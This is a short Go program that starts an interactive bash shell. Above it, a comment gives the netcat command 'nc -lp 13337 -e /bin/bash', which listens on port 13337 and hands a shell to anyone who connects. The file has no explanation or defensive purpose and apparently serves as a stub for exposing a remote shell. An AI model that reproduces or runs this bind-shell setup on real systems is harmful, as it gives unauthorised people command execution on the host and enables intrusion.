package main

import (
	"log"
	"os/exec"
)

// nc –lp 13337 –e /bin/bash


func main() {
	cmd := exec.Command("/bin/bash","-i")
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}